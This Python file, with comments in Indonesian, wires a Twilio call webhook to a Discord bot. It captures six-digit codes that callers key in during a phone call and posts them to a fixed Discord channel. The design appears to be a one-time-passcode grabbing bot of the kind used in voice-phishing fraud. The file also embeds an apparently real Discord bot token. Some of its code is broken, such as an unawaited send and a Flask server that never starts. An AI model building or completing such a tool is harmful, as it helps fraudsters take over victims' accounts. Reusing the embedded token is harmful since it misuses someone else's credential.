from flask import Flask, request, jsonify
import discord
from discord.ext import commands
import asyncio

app = Flask(__name__)

# Variabel untuk menyimpan status panggilan
call_status = 'Unknown'
# Variabel untuk menyimpan 6 digit angka dari panggilan
six_digit_input = None

# Inisialisasi bot Discord
intents = discord.Intents.default()
intents.typing = False
intents.presences = False

bot = commands.Bot(command_prefix='', intents=intents)

# Logika untuk menanggapi pesan suara dengan 6 digit angka
@bot.event
async def on_message(message):
    global six_digit_input
    if message.author == bot.user:
        return

    # Periksa apakah pesan suara memuat 6 digit angka
    if message.content.isdigit() and len(message.content) == 6:
        six_digit_input = message.content

        # Tambahkan logika tambahan sesuai kebutuhan
        await on_six_digit_input(six_digit_input)

    await bot.process_commands(message)

# Logika untuk menanggapi 6 digit angka yang dimasukkan
async def on_six_digit_input(six_digit_input):
    print(f"Enam digit angka yang dimasukkan: {six_digit_input}")

    # Tambahkan logika tambahan sesuai kebutuhan

# Logika untuk menanggapi panggilan yang selesai
@bot.event
async def on_call_end(call_status):
    if call_status == 'completed':
        print("Panggilan selesai dengan status: Completed")
    elif call_status == 'busy':
        print("Panggilan selesai dengan status: Busy")
    elif call_status == 'no-answer':
        print("Panggilan selesai dengan status: No Answer")
    elif call_status == 'cancelled':
        print("Panggilan selesai dengan status: Cancelled")
    elif call_status == 'failed':
        print("Panggilan selesai dengan status: Failed")
    else:
        print("Panggilan selesai dengan status tidak dikenal")

    # Tambahkan logika tambahan sesuai kebutuhan

# Endpoint untuk webhook Twilio
@app.route('/twilio-webhook', methods=['POST'])
def twilio_webhook():
    global call_status
    status = request.form['CallStatus']
    call_status = status  # Simpan status panggilan

    # Menanggapi panggilan yang selesai
    asyncio.run_coroutine_threadsafe(on_call_end(call_status), bot.loop)

    return jsonify({'status': status})

# Endpoint untuk memproses input 6 digit angka
@app.route('/process-input', methods=['POST'])
def process_input():
    global six_digit_input
    six_digit_input = request.form['Digits'] if 'Digits' in request.form else None

    # Kirim 6 digit angka ke bot Discord
    if six_digit_input:
        # Ganti ID_CHANNEL dengan ID channel Discord yang diinginkan
        channel = bot.get_channel(1190569533061210183)
        channel.send(f"Enam digit angka yang dimasukkan: {six_digit_input}")

        # Menanggapi 6 digit angka yang dimasukkan
        asyncio.run_coroutine_threadsafe(on_six_digit_input(six_digit_input), bot.loop)

    return str(six_digit_input)

# ... (kode selanjutnya)

if __name__ == '__main__':
    # Ganti TOKEN_DISCORD dengan token bot Discord yang valid
    bot.run('MTE5MDUwNTIyMjY1MzYyNDM2MQ.Gq0QqB.Hd6bMWZg91rlSqUp0JMb2ySfUjZdx21wGFKSMM')

    # Menjalankan aplikasi Flask
    app.run(host='0.0.0.0', port=5000)
